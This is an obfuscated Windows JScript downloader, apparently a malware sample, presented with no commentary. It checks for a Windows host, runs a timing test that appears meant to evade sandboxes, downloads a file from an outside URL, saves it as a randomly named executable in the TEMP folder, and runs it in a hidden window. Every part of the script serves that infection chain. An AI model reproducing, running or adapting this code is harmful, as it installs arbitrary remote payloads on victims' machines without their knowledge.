var gc = false;
var VK = "CreateObject";
var hb = function b() {return WScript[VK]("WScript.Shell");}(), QN = 11;
var zo = "MSXML2.XMLHTTP";
var w = 2123213;
var h = 0;
function E(Q0){hb["Run"](Q0, h, h);};
function J(){return "" + zo;};
function Hs(Kh, Z){h = h * 1; return Kh - Z;};
function Ji(){return VK;};
/*@cc_on
  @if (@_win32 || @_win64)
    gc = true;
  @end
@*/
if (gc)
{
var l = "";
function Wd(){return 22;};
var G = 0; var n = 0;
function xq()
{
var PI = new this["Date"]();
var r = PI["getUTCMilliseconds"]();
WScript["Sleep"](Wd());
var PI = new this["Date"]();
var yy = PI["getUTCMilliseconds"]();
WScript["Sleep"](Wd());
var PI = new this["Date"]();
var j = PI["getUTCMilliseconds"]();
var G = "ZY";
G = Hs(yy, r);
var n = "D";
n = Hs(j, yy);
l = "open";
return Hs(G, n);
}
var Jm = false;
var EU = false;
for (var b0 = h; b0 < Wd() * 1; b0++){if (xq() != h){
Jm = true; 
n = "31" + 11 * G + n; 
EU = true; 
break;
}}
function v() {return ((Jm == true) && (Jm == EU)) ? 1 : h;};
if (Jm && v() && EU){
function Q() {return hb["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "b7uG0vk9g4qsBc5Z.exe";};
 QP = J();
 ZU = WScript[VK](QP);
 var Xq = 1;
 while (Xq){
try {
ZU[l]("GET", "http://greenellebox.com/a1odk", false);
ZU["send"]();
Jx = "Sleep";
for (;;){WScript[Jx](Wd() * 11); if (ZU["readystate"] >= 2 * 2) break;};
Xq = h;
} catch(zQ){};
}
function rC(GA) {var X = (1, 2, 3, 4, 5, GA); return X;};
Vh = WScript[Ji()]("ADODB.Stream");
QP = Vh;
QP[l]();
QP["type"] = rC(1);
QP["write"](ZU["ResponseBody"]);
Vh["position"] = rC(h);
QP["Save" + "ToFile"](Q(), 2);
Vh["c"+"lose"]();
iJ = Q();
E(iJ);
}
}

